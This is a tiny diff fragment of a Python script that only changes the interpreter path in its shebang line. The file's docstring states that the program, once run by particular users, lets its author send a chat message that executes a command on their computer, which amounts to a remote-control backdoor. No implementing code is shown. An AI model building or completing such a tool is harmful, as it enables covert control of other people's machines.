@@ -1,4 +1,4 @@
-#! /venv/Scripts/python
+#! ./venv/Scripts/python
 """A program which when run by particular users, it will allow me to say something in chat and then a command gets
 executed on the persons computer:
 
